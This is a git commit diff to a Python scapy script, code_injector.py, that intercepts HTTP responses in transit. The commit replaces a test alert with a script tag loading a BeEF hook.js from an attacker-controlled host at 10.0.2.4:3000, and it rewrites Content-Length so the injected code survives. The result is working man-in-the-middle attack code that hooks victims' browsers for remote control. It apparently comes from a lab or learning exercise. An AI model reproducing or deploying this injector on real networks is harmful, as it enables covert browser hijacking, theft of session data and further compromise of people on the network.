6fe5d25871dbcbb3d4aee8c07f4e2d1a3c1fe203
Mário Gil <mg_mesquita@hotmail.com>
2018-07-26 22:42:00 +0100

    Changed js script to work with beef

--- code_injector.py
+++ code_injector.py
@@ -23,10 +23,14 @@ def process_packet(packet):
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
         elif scapy_packet[scapy.TCP].sport == 80:  # Response
             print("[+] Response")
-            load = load.replace("</body>", "<script>alert('test');</script></body>")
+            print(scapy_packet.show())
+            injection_code = '<script src="http://10.0.2.4:3000/hook.js"></script>'
+            load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-            if content_length_search :
+            if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
 
         if load != scapy_packet[scapy.Raw].load:
             new_packet = set_load(scapy_packet, load)
